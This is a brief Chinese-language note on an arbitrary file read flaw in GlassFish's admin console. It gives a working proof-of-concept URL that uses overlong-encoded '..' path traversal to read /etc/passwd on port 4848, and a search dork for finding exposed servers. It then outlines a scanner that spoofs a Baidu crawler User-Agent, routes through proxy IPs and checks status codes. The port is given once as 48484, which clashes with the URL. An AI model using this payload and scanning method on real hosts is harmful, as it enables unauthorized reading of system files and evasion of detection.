glassfish存在任意文件读取在默认48484端口，漏洞验证的poc为:

http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd--- 

"glassfish"&&"4848"

---根据url构建poc（分别为Windows和Linux的poc）

---这里添加了数据包的头部为：百度爬虫；设置了代理IP，报错是应为这个poc不适合 

---根据状态码的返回来判断漏洞是否存在 




